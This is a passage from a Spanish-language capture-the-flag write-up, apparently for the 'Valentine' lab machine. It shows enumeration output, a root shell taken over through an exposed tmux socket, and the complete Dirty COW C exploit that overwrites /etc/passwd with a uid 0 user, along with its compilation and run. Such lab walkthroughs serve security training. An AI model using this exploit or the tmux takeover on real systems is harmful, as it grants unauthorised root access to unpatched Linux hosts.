/etc/crontab:52 6       1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
/etc/cron.d/php5:09,39 *     * * *     root   [ -x /usr/lib/php5/maxlifetime ] && [ -d /var/lib/php5 ] && find /var/lib/php5/ -de
pth -mindepth 1 -maxdepth 1 -type f -cmin +$(/usr/lib/php5/maxlifetime) ! -execdir fuser -s {} 2>/dev/null \; -delete
/etc/cron.d/anacron:SHELL=/bin/sh
/etc/cron.d/anacron:PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
/etc/cron.d/anacron:30 7    * * *   root        start -q anacron || :
/etc/anacrontab:SHELL=/bin/sh
/etc/anacrontab:PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
/etc/anacrontab:1       5       cron.daily       nice run-parts --report /etc/cron.daily
/etc/anacrontab:7       10      cron.weekly      nice run-parts --report /etc/cron.weekly
/etc/anacrontab:@monthly        15      cron.monthly nice run-parts --report /etc/cron.monthly
---
[*] ret030 Can we read user crontabs....................................... nope
[*] ret040 Can we list other user cron tasks?.............................. nope
[*] ret050 Can we write to any paths present in cron jobs.................. yes!
---
/var/crash
/var/crash/.
/var/lib/php5
/var/lib/php5/
---
[!] ret060 Can we write to executable paths present in cron jobs........... yes!
---
/etc/cron.d/php5:09,39 *     * * *     root   [ -x /usr/lib/php5/maxlifetime ] && [ -d /var/lib/php5 ] && find /var/lib/php5/ -de
pth -mindepth 1 -maxdepth 1 -type f -cmin +$(/usr/lib/php5/maxlifetime) ! -execdir fuser -s {} 2>/dev/null \; -delete
/etc/cron.d/php5:09,39 *     * * *     root   [ -x /usr/lib/php5/maxlifetime ] && [ -d /var/lib/php5 ] && find /var/lib/php5/ -de
pth -mindepth 1 -maxdepth 1 -type f -cmin +$(/usr/lib/php5/maxlifetime) ! -execdir fuser -s {} 2>/dev/null \; -delete
---
[i] ret400 Cron files...................................................... skip
[*] ret500 User systemd timers............................................. nope
[!] ret510 Can we write in any system timer?............................... nope
[i] ret900 Systemd timers.................................................. skip
================================================================( network )=====
[*] net000 Services listening only on localhost............................ yes!
tcp    LISTEN     0      128            127.0.0.1:631                   *:*     
---
[!] net010 Can we sniff traffic with tcpdump?.............................. nope
[i] net500 NIC and IP information.......................................... skip
[i] net510 Routing table................................................... skip
[i] net520 ARP table....................................................... skip
[i] net530 Nameservers..................................................... skip
[i] net540 Systemd Nameservers............................................. skip
[i] net550 Listening TCP................................................... skip
[i] net560 Listening UDP................................................... skip
===============================================================( services )=====
[!] srv000 Can we write in service files?.................................. nope
[!] srv010 Can we write in binaries executed by services?.................. nope
[*] srv020 Files in /etc/init.d/ not belonging to root..................... nope
[*] srv030 Files in /etc/rc.d/init.d not belonging to root................. nope
[*] srv040 Upstart files not belonging to root............................. nope
[*] srv050 Files in /usr/local/etc/rc.d not belonging to root.............. nope
[i] srv400 Contents of /etc/inetd.conf..................................... skip
[i] srv410 Contents of /etc/xinetd.conf.................................... skip
[i] srv420 List /etc/xinetd.d if used...................................... skip
[i] srv430 List /etc/init.d/ permissions................................... skip
[i] srv440 List /etc/rc.d/init.d permissions............................... skip
[i] srv450 List /usr/local/etc/rc.d permissions............................ skip
[i] srv460 List /etc/init/ permissions..................................... skip
[!] srv500 Can we write in systemd service files?.......................... nope
[!] srv510 Can we write in binaries executed by systemd services?.......... nope
[*] srv520 Systemd files not belonging to root............................. nope
[i] srv900 Systemd config files permissions................................ skip
===============================================================( software )=====
[!] sof000 Can we connect to MySQL with root/root credentials?............. nope
[!] sof010 Can we connect to MySQL as root without password?............... nope
[!] sof015 Are there credentials in mysql_history file?.................... nope
[!] sof020 Can we connect to PostgreSQL template0 as postgres and no pass?. nope
[!] sof020 Can we connect to PostgreSQL template1 as postgres and no pass?. nope
[!] sof020 Can we connect to PostgreSQL template0 as psql and no pass?..... nope
[!] sof020 Can we connect to PostgreSQL template1 as psql and no pass?..... nope
[*] sof030 Installed apache modules........................................ yes!
---
Loaded Modules:
 core_module (static)
 log_config_module (static)
 logio_module (static)
 mpm_prefork_module (static)
 http_module (static)
 so_module (static)
 alias_module (shared)
 auth_basic_module (shared)
 authn_file_module (shared)
 authz_default_module (shared)
 authz_groupfile_module (shared) 
 authz_host_module (shared)
 authz_user_module (shared)
 autoindex_module (shared)
 cgi_module (shared)
 deflate_module (shared)
 dir_module (shared)
 env_module (shared)
 mime_module (shared)
 negotiation_module (shared)
 php5_module (shared)
 reqtimeout_module (shared)
 setenvif_module (shared)
 ssl_module (shared)
 status_module (shared)
---
[!] sof040 Found any .htpasswd files?...................................... nope
[!] sof050 Are there private keys in ssh-agent?............................ nope
[!] sof060 Are there gpg keys cached in gpg-agent?......................... nope
[!] sof070 Can we write to a ssh-agent socket?............................. nope
[!] sof080 Can we write to a gpg-agent socket?............................. nope
[!] sof090 Found any keepass database files?............................... nope
[!] sof100 Found any 'pass' store directories?............................. nope
[!] sof110 Are there any tmux sessions available?.......................... nope
[*] sof120 Are there any tmux sessions from other users?................... nope
[!] sof130 Can we write to tmux session sockets from other users?.......... nope
[!] sof140 Are any screen sessions available?.............................. nope
[*] sof150 Are there any screen sessions from other users?................. nope
[!] sof160 Can we write to screen session sockets from other users?........ nope
[i] sof500 Sudo version.................................................... skip
[i] sof510 MySQL version................................................... skip
[i] sof520 Postgres version................................................ skip
[i] sof530 Apache version.................................................. skip
[i] sof540 Tmux version.................................................... skip
[i] sof550 Screen version.................................................. skip
=============================================================( containers )=====
[*] ctn000 Are we in a docker container?................................... nope
[*] ctn010 Is docker available?............................................ nope
[!] ctn020 Is the user a member of the 'docker' group?..................... nope
[*] ctn200 Are we in a lxc container?...................................... nope                                                 
[!] ctn210 Is the user a member of any lxc/lxd group?...................... nope                                                 
==============================================================( processes )=====
[i] pro000 Waiting for the process monitor to finish....................... yes!                                                 
[i] pro001 Retrieving process binaries..................................... yes!                                                 
[i] pro002 Retrieving process users........................................ yes!                                                 
[!] pro010 Can we write in any process binary?............................. nope
[*] pro020 Processes running with root permissions......................... yes!
---
START      PID     USER COMMAND
18:42     2639     root /usr/sbin/console-kit-daemon --no-daemon 
16:17      998     root /sbin/getty -8 38400 tty4
16:17      909     root /usr/sbin/sshd -D
16:17      795     root /usr/lib/policykit-1/polkitd --no-debug
16:17      783     root /usr/sbin/cupsd -F
16:17      767     root upstart-socket-bridge --daemon
16:17      654     root NetworkManager
16:17      604     root /usr/sbin/bluetoothd
16:17      583     root /usr/sbin/modem-manager
16:17      519     root /sbin/udevd --daemon
16:17      518     root /sbin/udevd --daemon
16:17      312     root /sbin/udevd --daemon
16:17      308     root upstart-udev-bridge --daemon
16:17     1632     root //usr/lib/vmware-caf/pme/bin/ManagementAgentHost
16:17     1597     root /usr/lib/vmware-vgauth/VGAuthService -s
16:17     1436     root /sbin/getty -8 38400 tty1
16:17     1248     root /usr/sbin/apache2 -k start
16:17     1095     root /usr/bin/vmtoolsd
16:17     1047     root cron
16:17     1046     root acpid -c /etc/acpi/events -s /var/run/acpid.socket
16:17     1029     root /sbin/getty -8 38400 tty6
16:17     1023     root /sbin/getty -8 38400 tty3
16:17     1022     root /sbin/getty -8 38400 tty2
16:17     1017     root -bash
16:17     1013     root /usr/bin/tmux -S /.devs/dev_sess
16:17     1006     root /sbin/getty -8 38400 tty5
16:17        1     root /sbin/init
---
[*] pro030 Processes running by non-root users with shell.................. yes!
---


------ daemon ------


START      PID     USER COMMAND
16:17     1048   daemon atd


------ www-data ------


START      PID     USER COMMAND
18:31     2603 www-data /usr/sbin/apache2 -k start
18:29     2165 www-data /usr/sbin/apache2 -k start
18:29     2164 www-data /usr/sbin/apache2 -k start
18:29     2163 www-data /usr/sbin/apache2 -k start
18:29     2162 www-data /usr/sbin/apache2 -k start
18:29     2161 www-data /usr/sbin/apache2 -k start


------ hype ------


START      PID     USER COMMAND
19:16    46903     hype sleep 1
19:16    46687     hype sleep 1
19:16    46513     hype sleep 1
19:16    46319     hype sleep 1
19:16    46110     hype sleep 1
19:16    45908     hype sleep 1
19:16    45700     hype sleep 1
19:16    45508     hype sleep 1
19:16    45310     hype sleep 1
19:16    45115     hype sleep 1
19:16    44904     hype sleep 1
19:16    44709     hype sleep 1
19:16    44518     hype sleep 1
19:16    44323     hype sleep 1
19:16    44112     hype sleep 1
19:16    43921     hype sleep 1
19:16    43716     hype sleep 1
19:16    43532     hype sleep 1
19:16    43343     hype sleep 1
19:16    43137     hype sleep 1
19:16    42930     hype sleep 1
19:16    42734     hype sleep 1
19:16    42530     hype sleep 1
19:16    42325     hype sleep 1
19:16    42126     hype sleep 1
19:16    41921     hype sleep 1
19:16    41730     hype sleep 1
19:16    41524     hype sleep 1
19:16    41324     hype sleep 1
19:16    41128     hype sleep 1
19:16    40924     hype sleep 1
19:16    40722     hype sleep 1
19:16    40524     hype sleep 1
19:16    40313     hype sleep 1
19:16    40121     hype sleep 1
19:16    39930     hype sleep 1
19:16    39722     hype sleep 1
19:16    39511     hype sleep 1
19:16    39329     hype sleep 1
19:16    39122     hype sleep 1
19:16    38919     hype sleep 1
19:16    38727     hype sleep 1
19:16    38525     hype sleep 1
19:16    38320     hype sleep 1
19:16    38127     hype sleep 1
19:16    37944     hype sleep 1
19:16    37733     hype sleep 1
19:16    37539     hype sleep 1
19:16    37336     hype sleep 1
19:16    37141     hype sleep 1
19:16    36953     hype sleep 1
19:16    36736     hype sleep 1
19:16    36413     hype sleep 1
19:16    36090     hype sleep 1
19:16    36089     hype /bin/sh ./lse.sh -l 1
19:16    36012     hype find / -path /proc -prune -o -path /sys -prune -o -path /dev -prune -o -name *dockerenv* -exec ls -la {} 
;
19:16    36009     hype /bin/sh ./lse.sh -l 1
19:16    35894     hype find / -path /proc -prune -o -path /sys -prune -o -path /dev -prune -o -name .password-store -readable -t
ype d -print
19:16    35892     hype /bin/sh ./lse.sh -l 1
19:16    35828     hype find / -path /proc -prune -o -path /sys -prune -o -path /dev -prune -o -regextype egrep -iregex .*\.kdbx?
 -readable -type f -print
19:16    35827     hype /bin/sh ./lse.sh -l 1
19:16    35804     hype /bin/sh ./lse.sh -l 1
19:16    35780     hype /bin/sh ./lse.sh -l 1
19:16    35719     hype find / -path /proc -prune -o -path /sys -prune -o -path /dev -prune -o -name *.htpasswd -print -exec cat 
{} ;
19:16    35717     hype /bin/sh ./lse.sh -l 1
19:16    35704     hype /usr/sbin/apache2 -M
19:16    35703     hype /bin/sh /usr/sbin/apache2ctl -M
19:16    35701     hype /bin/sh ./lse.sh -l 1
19:16    35449     hype sleep 0.2
19:16    35447     hype grep -i listening on lo
19:16    35446     hype /bin/sh ./lse.sh -l 1
19:16    35444     hype /bin/sh ./lse.sh -l 1
19:16    35432     hype /bin/sh ./lse.sh -l 1
19:16    35390     hype /bin/sh ./lse.sh -l 1
19:16    35322     hype /bin/sh ./lse.sh -l 1
19:16    35254     hype /bin/sh ./lse.sh -l 1
19:16    35252     hype /bin/sh ./lse.sh -l 1
19:16    35161     hype getcap -r /
19:16    35159     hype /bin/sh ./lse.sh -l 1
19:16    35070     hype grep -v root
19:16    35069     hype /bin/sh ./lse.sh -l 1
19:16    35068     hype /bin/sh ./lse.sh -l 1
19:16    34972     hype find / -path /proc -prune -o -path /sys -prune -o -path /dev -prune -o -path /usr/lib -prune -o -path /us
r/share -prune -o -regextype egrep -iregex .*(backup|dump|cop(y|ies)|bak|bkp)[^/]*\.(sql|tgz|tar|zip)?\.?(gz|xz|bzip2|bz2|lz|7z)?
 -readable -type f -exec ls -al {} ;
19:16    34970     hype /bin/sh ./lse.sh -l 1
19:16    34949     hype /bin/sh ./lse.sh -l 1
19:16    34898     hype find / -path /proc -prune -o -path /sys -prune -o -path /dev -prune -o ( -name .git -o -name .svn ) -prin
t
19:16    34896     hype /bin/sh ./lse.sh -l 1
19:16    34850     hype /bin/sh ./lse.sh -l 1
19:15    34807     hype find /home/hype ( -name *id_dsa* -o -name *id_rsa* -o -name *id_ecdsa* -o -name *id_ed25519* -o -name kno
wn_hosts -o -name authorized_hosts -o -name authorized_keys ) -exec ls -la {} ;
19:15    34801     hype /bin/sh ./lse.sh -l 1
19:15    34730     hype /bin/sh ./lse.sh -l 1
19:15    34715     hype /bin/sh ./lse.sh -l 1
19:15    34707     hype /bin/sh ./lse.sh -l 1
19:15    34695     hype /bin/sh ./lse.sh -l 1
19:15    34439     hype /bin/sh ./lse.sh -l 1
19:15    34383     hype find / -path /proc -prune -o -path /sys -prune -o -path /dev -prune -o -perm -4000 -type f -print
19:15    34382     hype /bin/sh ./lse.sh -l 1
19:15    34325     hype find / -path /home/hype -prune -o -path /proc -prune -o -path /sys -prune -o -path /dev -prune -o -type l
 -user hype -print
19:15    34251     hype find / -path /home/hype -prune -o -path /proc -prune -o -path /sys -prune -o -path /dev -prune -o -not -t
ype l -writable -print
19:15    34249     hype /bin/sh ./lse.sh -l 1
19:15    34217     hype /bin/sh ./lse.sh -l 1
19:15    34184     hype sort -u
19:15    34183     hype tr : 
19:15    34182     hype cut -d= -f2
19:15    34181     hype tr -d "'
19:15    34180     hype grep -ERh ^ *PATH=.* /etc/
19:15    34179     hype /bin/sh ./lse.sh -l 1
19:15    34178     hype /bin/sh ./lse.sh -l 1
19:15    34127     hype sed s/^ *//g
19:15    34126     hype uniq -c
19:15    34125     hype sort -Mr
19:15    34123     hype grep -v ^START
19:15    34121     hype sed s/^ *//g
19:15    34119     hype /bin/sh ./lse.sh -l 1
19:15    34117     hype sleep 60
19:15    34115     hype /bin/sh ./lse.sh -l 1
19:15    34114     hype /bin/sh ./lse.sh -l 1
19:15    34085     hype /bin/sh ./lse.sh -l 1
18:42     2846     hype -bash
18:42     2845     hype sshd: hype@pts/0 
---
[i] pro500 Running processes............................................... skip
[i] pro510 Running process binaries and permissions........................ skip

==================================( FINISHED )==================================
hype@Valentine:/dev/shm$
```

Vemos algo curioso dentro del apartado **Writable files outside user's home**:

```bash
[*] fst000 Writable files outside user's home.............................. yes!
---
/run/vmware/guestServicePipe
/run/acpid.socket
/run/avahi-daemon/socket
/run/sdp
/run/cups/cups.sock
/run/dbus/system_bus_socket
/run/shm
/run/shm/lse.sh
/run/lock
/.devs/dev_sess
/var/lib/php5
/var/www/omg.jpg
/var/tmp
/var/crash
/tmp
/tmp/tmp.9qWzROTtty
/tmp/tmux-1000
/tmp/.ICE-unix
/tmp/tmp.arePmwDykO
/tmp/.X11-unix
---
```

Tenemos el recurso `/.devs/dev_sess` que es raro que se encuentre en la raiz del sistema, así que vamos a echarle un ojo:

```bash
hype@Valentine:/dev/shm$ ls -l /.devs/dev_sess
srw-rw---- 1 root hype 0 Oct 19 16:17 /.devs/dev_sess
hype@Valentine:/dev/shm$ file /.devs/dev_sess
/.devs/dev_sess: socket
hype@Valentine:/dev/shm$
```

Vemos que se trata de un ***socket*** y el grupo asignado es **hype**. Podemos pensar que se trata de una sesión de tmux del usuario **root**, así que primero validaremos si se encuenta con la herramienta:

```bash
hype@Valentine:/dev/shm$ which tmux
/usr/bin/tmux
hype@Valentine:/dev/shm$
```

Vemos que si, por lo que vamos a conectarnos a la sesión:

```bash
hype@Valentine:/dev/shm$ tmux -S /.devs/dev_sess
root@Valentine:/run/shm# whoami
root
root@Valentine:/run/shm#
```

Ya nos encontramos como el usuario **root** y podemos visualizar la flag (root.txt).

Otra forma de escalar privilegios es mediante la vulneración del kernel de linux:

```bash
hype@Valentine:/dev/shm$ uname -a
Linux Valentine 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux
hype@Valentine:/dev/shm$ lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 12.04 LTS
Release:        12.04
Codename:       precise
hype@Valentine:/dev/shm$
```

Vemos la versión 3.2.0, por lo que ya debemos estar pensando en ***Dirty cow***; para nuestro caso, utilizaremos aquel relacionado con ***/etc/passwd***: [Dirty COW' 'PTRACE_POKEDATA](https://www.exploit-db.com/exploits/40839). Creamos el archivo `dirty.c` dentro de la máquina víctima y modificamos el parámetro `user.username = "firefart";` por nuestro nombre de usuario que queramos: `user.username = "k4miyo";`

```c
//
// This exploit uses the pokemon exploit of the dirtycow vulnerability
// as a base and automatically generates a new passwd line.
// The user will be prompted for the new password when the binary is run.
// The original /etc/passwd file is then backed up to /tmp/passwd.bak
// and overwrites the root account with the generated line.
// After running the exploit you should be able to login with the newly
// created user.
//
// To use this exploit modify the user values according to your needs.
//   The default is "firefart".
//
// Original exploit (dirtycow's ptrace_pokedata "pokemon" method):
//   https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c
//
// Compile with:
//   gcc -pthread dirty.c -o dirty -lcrypt
//
// Then run the newly create binary by either doing:
//   "./dirty" or "./dirty my-new-password"
//
// Afterwards, you can either "su firefart" or "ssh firefart@..."
//
// DON'T FORGET TO RESTORE YOUR /etc/passwd AFTER RUNNING THE EXPLOIT!
//   mv /tmp/passwd.bak /etc/passwd
//
// Exploit adopted by Christian "FireFart" Mehlmauer
// https://firefart.at
//

#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <stdlib.h>
#include <unistd.h>
#include <crypt.h>

const char *filename = "/etc/passwd";
const char *backup_filename = "/tmp/passwd.bak";
const char *salt = "firefart";

int f;
void *map;
pid_t pid;
pthread_t pth;
struct stat st;

struct Userinfo {
   char *username;
   char *hash;
   int user_id;
   int group_id;
   char *info;
   char *home_dir;
   char *shell;
};

char *generate_password_hash(char *plaintext_pw) {
  return crypt(plaintext_pw, salt);
}

char *generate_passwd_line(struct Userinfo u) {
  const char *format = "%s:%s:%d:%d:%s:%s:%s\n";
  int size = snprintf(NULL, 0, format, u.username, u.hash,
    u.user_id, u.group_id, u.info, u.home_dir, u.shell);
  char *ret = malloc(size + 1);
  sprintf(ret, format, u.username, u.hash, u.user_id,
    u.group_id, u.info, u.home_dir, u.shell);
  return ret;
}

void *madviseThread(void *arg) {
  int i, c = 0;
  for(i = 0; i < 200000000; i++) {
    c += madvise(map, 100, MADV_DONTNEED);
  }
  printf("madvise %d\n\n", c);
}

int copy_file(const char *from, const char *to) {
  // check if target file already exists
  if(access(to, F_OK) != -1) {
    printf("File %s already exists! Please delete it and run again\n",
      to);
    return -1;
  }

  char ch;
  FILE *source, *target;

  source = fopen(from, "r");
  if(source == NULL) {
    return -1;
  }
  target = fopen(to, "w");
  if(target == NULL) {
     fclose(source);
     return -1;
  }

  while((ch = fgetc(source)) != EOF) {
     fputc(ch, target);
   }

  printf("%s successfully backed up to %s\n",
    from, to);

  fclose(source);
  fclose(target);

  return 0;
}

int main(int argc, char *argv[])
{
  // backup file
  int ret = copy_file(filename, backup_filename);
  if (ret != 0) {
    exit(ret);
  }

  struct Userinfo user;
  // set values, change as needed
  user.username = "k4miyo";
  user.user_id = 0;
  user.group_id = 0;
  user.info = "pwned";
  user.home_dir = "/root";
  user.shell = "/bin/bash";

  char *plaintext_pw;

  if (argc >= 2) {
    plaintext_pw = argv[1];
    printf("Please enter the new password: %s\n", plaintext_pw);
  } else {
    plaintext_pw = getpass("Please enter the new password: ");
  }

  user.hash = generate_password_hash(plaintext_pw);
  char *complete_passwd_line = generate_passwd_line(user);
  printf("Complete line:\n%s\n", complete_passwd_line);

  f = open(filename, O_RDONLY);
  fstat(f, &st);
  map = mmap(NULL,
             st.st_size + sizeof(long),
             PROT_READ,
             MAP_PRIVATE,
             f,
             0);
  printf("mmap: %lx\n",(unsigned long)map);
  pid = fork();
  if(pid) {
    waitpid(pid, NULL, 0);
    int u, i, o, c = 0;
    int l=strlen(complete_passwd_line);
    for(i = 0; i < 10000/l; i++) {
      for(o = 0; o < l; o++) {
        for(u = 0; u < 10000; u++) {
          c += ptrace(PTRACE_POKETEXT,
                      pid,
                      map + o,
                      *((long*)(complete_passwd_line + o)));
        }
      }
    }
    printf("ptrace %d\n",c);
  }
  else {
    pthread_create(&pth,
                   NULL,
                   madviseThread,
                   NULL);
    ptrace(PTRACE_TRACEME);
    kill(getpid(), SIGSTOP);
    pthread_join(pth,NULL);
  }

  printf("Done! Check %s to see if the new user was created.\n", filename);
  printf("You can log in with the username '%s' and the password '%s'.\n\n",
    user.username, plaintext_pw);
    printf("\nDON'T FORGET TO RESTORE! $ mv %s %s\n",
    backup_filename, filename);
  return 0;
}
```

Lo compilamos de acuerdo a como nos indica el script:

```bash
hype@Valentine:/dev/shm$ gcc -pthread dirty.c -o dirty -lcrypt
hype@Valentine:/dev/shm$ ll
total 68
drwxrwxrwt  2 root root   100 Oct 19 19:51 ./
drwxr-xr-x 20 root root   740 Oct 19 19:40 ../
-rwxrwxr-x  1 hype hype 14116 Oct 19 19:51 dirty*
-rw-rw-r--  1 hype hype  4813 Oct 19 19:51 dirty.c
-rwxrwxr-x  1 hype hype 43570 Oct 19 19:04 lse.sh*
hype@Valentine:/dev/shm$ 
```

Y cuando ejecutamos el script, nos va a pedir que introduzcamos una contraseña, puede ser la que nosotros queremos ya que el programa creará nuestro usuario (para este caso **k4miyo**) en el archivo `/etc/passwd` con la contraseña que nosotros le indiquemos y dentro del grupo **root**:

```bash
hype@Valentine:/dev/shm$ ./dirty 
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: 
Complete line:
k4miyo:fiWV.l3JFnVCk:0:0:pwned:/root:/bin/bash

mmap: 7f62bca50000
^C
hype@Valentine:/dev/shm$ cat /etc/passwd
k4miyo:fiWV.l3JFnVCk:0:0:pwned:/root:/bin/bash
sr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:105::/var/run/dbus:/bin/false
colord:x:103:108:colord colour management daemon,,,:/var/lib/colord:/bin/false
lightdm:x:104:111:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:105:114::/nonexistent:/bin/false
avahi-autoipd:x:106:117:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:107:118:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
usbmux:x:108:46:usbmux daemon,,,:/home/usbmux:/bin/false
kernoops:x:109:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:110:119:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:111:122:RealtimeKit,,,:/proc:/bin/false
speech-dispatcher:x:112:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/sh
hplip:x:113:7:HPLIP system user,,,:/var/run/hplip:/bin/false
saned:x:114:123::/home/saned:/bin/false
hype:x:1000:1000:Hemorrhage,,,:/home/hype:/bin/bash
sshd:x:115:65534::/var/run/sshd:/usr/sbin/nologin
hype@Valentine:/dev/shm$
```

Ahora migramos a nuestro usuario y ya podemos visualizar la flag (root.txt).

```bash
hype@Valentine:/dev/shm$ su k4miyo
Password: 
k4miyo@Valentine:/dev/shm# id
uid=0(k4miyo) gid=0(root) groups=0(root)
k4miyo@Valentine:/dev/shm#
```
